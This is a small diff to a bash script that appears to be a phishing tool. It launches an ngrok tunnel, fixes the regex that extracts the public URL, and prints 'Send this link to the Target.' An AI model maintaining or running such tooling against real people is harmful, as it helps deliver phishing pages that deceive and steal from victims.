@@ -767,7 +767,7 @@ elif [[ $select == 13 ]]; then
   ./ngrok http 3333 > /dev/null 2>&1 &
   sleep 10
 
-  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z-]*\.ngrok.io")
   echo -e "${lb}[*] Send this link to the Target:${n}" $link
   checkfound
   }
